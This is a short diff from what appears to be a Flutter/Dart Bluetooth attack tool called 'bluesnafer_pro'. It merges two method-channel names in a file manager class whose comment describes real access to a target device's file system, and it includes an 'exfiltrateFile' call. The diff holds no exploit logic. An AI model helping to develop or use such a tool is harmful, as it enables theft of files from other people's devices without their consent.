@@ -19,7 +19,6 @@ class BluetoothException implements Exception {
 /// Implementa funcionalidades reales para acceder al sistema de archivos del dispositivo objetivo
 class BluetoothFileManager {
   static const String _channelName = 'com.bluesnafer_pro/bluetooth';
-  static const String _fileChannelName = 'com.bluesnafer_pro/files';
   static final _logger = AdvancedLogger('BluetoothFileManager');
 
   // Comandos reales de acceso a archivos
@@ -194,7 +193,7 @@ class BluetoothFileManager {
     int? length,
   }) async {
     try {
-      const platform = MethodChannel(_fileChannelName);
+      const platform = MethodChannel(_channelName);
 
       final Map<String, dynamic> params = {
         'deviceAddress': deviceAddress,
@@ -233,7 +232,7 @@ class BluetoothFileManager {
     bool overwrite = false,
   }) async {
     try {
-      const platform = MethodChannel(_fileChannelName);
+      const platform = MethodChannel(_channelName);
 
       final result = await platform.invokeMethod('exfiltrateFile', {
         'deviceAddress': deviceAddress,
